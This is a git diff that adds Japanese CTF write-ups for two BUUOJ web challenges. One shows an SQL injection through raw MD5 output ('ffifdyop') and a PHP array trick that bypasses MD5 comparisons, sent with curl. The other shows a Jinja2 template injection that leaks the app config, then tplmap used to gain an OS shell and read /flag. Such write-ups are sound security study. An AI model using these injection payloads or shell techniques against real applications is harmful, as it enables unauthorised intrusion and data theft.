@@ -27,6 +27,8 @@
 - [[极客大挑战 2019]BuyFlag](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019buyflag)
 - [[网鼎杯 2018]Fakebook](#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook)
 - [[ZJCTF 2019]NiZhuanSiWei](#zjctf-2019nizhuansiwei)
+- [[BJDCTF2020]Easy MD5](#bjdctf2020easy-md5)
+- [[BJDCTF 2nd]fake google】](#bjdctf-2ndfake-google)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -1478,4 +1480,178 @@ http://7f8d93d5-377c-463b-bf80-c202780bdeff.node3.buuoj.cn/?text=data://text/pla
 	return ("flag{404d0ade-fd76-4a75-85d7-1b56ad689c09}"); } 
 ?>
 <br>U R SO CLOSE !///COME ON PLZ
+```
 
+# [BJDCTF2020]Easy MD5
+
+レスポンスのヘッダーに
+```
+Hint: select * from 'admin' where password=md5($pass,true)
+```
+
+md5関数
+> str 文字列。
+> raw_output オプションのraw_output に TRUE が指定された場合、 md5 ダイジェストが 16 バイト長のバイナリ形式で返されます。
+
+md5関数の第2引数がtrueになっているので、md5でハッシュ化したあとに16バイト長のバイナリデータ変換されるっぽい。
+
+
+つまり、md5でハッシュ化して16バイト長のバイナリデータに変換した結果がSQLインジェクションにつながるような文字列をGETで渡せばいいんですけどわからない。
+調べると、ffifdyopという文字列が使えるらしい
+```
+ffifdyop
+	
+After MD5	276f722736c95d99e921722cf9ed621c
+Convert to 16-character binary format	'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c
+mysql automatically parses into string	'or’6]!r,b
+So the expression in the hint will become:
+select * from 'admin' where password=''or'6]!r,b'
+When or is followed by a number, the sql statement becomes:
+select * from 'admin' where password=''or true
+```
+
+
+```
+<!-- $a = $GET['a']; $b = $_GET['b'];
+	if($a != $b && md5($a) == md5($b)){
+		// wow, glzjin wants a girl friend. -->
+```
+
+https://pikpikcu.github.io/cheatsheet/Type-Juggling
+
+\
+わざわざphp type juggling利用して衝突するmd5しらべたけど、a[]=1&b[]=2でいけるらしい。
+
+```
+<?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+}
+```
+
+md5は衝突することが証明されてるので
+```
+$ git clone https://github.com/thereal1024/python-md5-collision.git
+$ python3 gen_coll_test.py
+```
+
+で衝突する文字列を作成したがうまくいかなかった。
+```
+$ curl -i 'http://a3d8dc4e-d2e4-4a15-b698-ae8f24e27f2b.node3.buuoj.cn/levell14.php?param1=$(cat out_test_001.txt)&param2=$(cat out_test_002.txt)'
+```
+結局
+```
+$ curl -i 'http://a3d8dc4e-d2e4-4a15-b698-ae8f24e27f2b.node3.buuoj.cn/levell14.php' --data 'param1[]=1&param2[]=2'
+```
+```
+</code>flag{9befd402-9915-4e67-9c42-d7e5b3d1cbae}
+```
+
+これでいける。==でもないのになんでいけるのかまだよくわかってない。
+
+実験してみると
+```php
+ <?php                                                                      
+$param1[] = 1;
+$param2[] = 2;
+
+if($param1 != $param2 && md5($param1) === md5($param2)){
+    echo "Yes";
+ }else{
+    echo "No";
+ }
+ ?>
+ ```
+
+ ```
+ % php hash_text.php
+
+Warning: md5() expects parameter 1 to be string, array given in /Users/takumaniwa/Downloads/hash_text.php on line 8
+
+Warning: md5() expects parameter 1 to be string, array given in /Users/takumaniwa/Downloads/hash_text.php on line 8
+Yes%                       
+```
+たしかにいける
+
+#  [BJDCTF 2nd]fake google】
+```
+<!--ssssssti & a little trick --> P3's girlfirend is : aaa<br><hr>
+```
+SSTI（サーバサイドテンプレートインジェクション）の脆弱性がある??
+```
+?name={{config}}
+```
+```
+P3's girlfirend is : <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'sssssssSFSCFAS', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
+```
+テンプレートインジェクションの脆弱性があることはわかったのでtlpmapを利用してシェルを起動してみます。
+
+```
+$ ./tplmap.py -u "http://8caa370a-dc03-4792-ab0d-bd8771a391af.node3.buuoj.cn/qaq?name=test" --os-shell
+[+] Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+[+] Testing if GET parameter 'name' is injectable
+[+] Smarty plugin is testing rendering with tag '*'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+[+] Mako plugin is testing blind injection
+[+] Python plugin is testing rendering with tag 'str(*)'
+[+] Python plugin is testing blind injection
+[+] Tornado plugin is testing rendering with tag '{{*}}'
+[+] Tornado plugin is testing blind injection
+[+] Jinja2 plugin is testing rendering with tag '{{*}}'
+[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
+[+] Tplmap identified the following injection point:
+
+  GET parameter: name
+  Engine: Jinja2
+  Injection: {{*}}
+  Context: text
+  OS: posix-linux
+  Technique: render
+  Capabilities:
+
+   Shell command execution: ok
+   Bind and reverse shell: ok
+   File write: ok
+   File read: ok
+   Code evaluation: ok, python code
+
+[+] Run commands on the operating system.
+posix-linux $ ls
+app.py
+static
+templates
+posix-linux $ ls /
+app
+bd_build
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+posix-linux $ cat /flag
+flag{53d623d5-0946-4207-a1d1-3244e6e8371b}
+posix-linux $ [+] Exiting.
+```
